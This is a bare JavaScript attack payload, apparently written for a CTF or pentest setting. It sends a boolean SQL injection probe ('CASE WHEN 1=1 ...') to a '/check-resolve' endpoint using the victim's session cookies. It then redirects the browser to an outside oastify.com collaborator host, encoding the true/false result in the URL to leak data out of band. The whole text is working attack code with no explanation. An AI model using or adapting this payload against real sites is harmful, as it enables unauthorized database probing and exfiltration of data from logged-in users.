(async()=>{
 const b=new URLSearchParams();
 b.append('id',"CASE WHEN 1=1 THEN 6 ELSE 7 END");

 const r=await fetch('/check-resolve',{
  method:'POST',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:b,
  credentials:'include'
 });

 const t=await r.text();
 location='https://69dhe9lld0mijzazkdptyo7xiorff83x.oastify.com/'+(t.includes('Not yet')?'T':'F');
})();